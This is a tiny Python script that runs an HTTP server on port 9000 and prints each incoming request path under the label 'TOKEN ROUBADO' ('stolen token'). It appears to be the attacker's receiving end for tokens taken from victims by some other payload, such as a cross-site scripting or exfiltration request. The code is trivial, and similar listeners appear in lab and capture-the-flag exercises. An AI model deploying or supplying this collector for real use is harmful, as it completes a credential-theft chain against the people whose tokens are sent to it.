from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("TOKEN ROUBADO =>", self.path)
        self.send_response(200)
        self.end_headers()

HTTPServer(("0.0.0.0", 9000), Handler).serve_forever()